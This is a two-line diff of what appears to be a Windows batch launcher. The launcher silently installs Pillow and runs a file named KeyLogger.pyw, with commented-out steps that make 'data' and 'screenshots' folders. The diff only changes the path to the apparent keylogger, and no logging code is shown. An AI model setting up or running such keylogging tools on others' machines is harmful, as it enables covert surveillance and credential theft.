@@ -14,4 +14,4 @@ py -m pip install --upgrade Pillow --quiet
 @REM mkdir data
 @REM mkdir screenshots
 @REM py script.py
-py KeyLogger.pyw
+py KeyLogger/KeyLogger.pyw
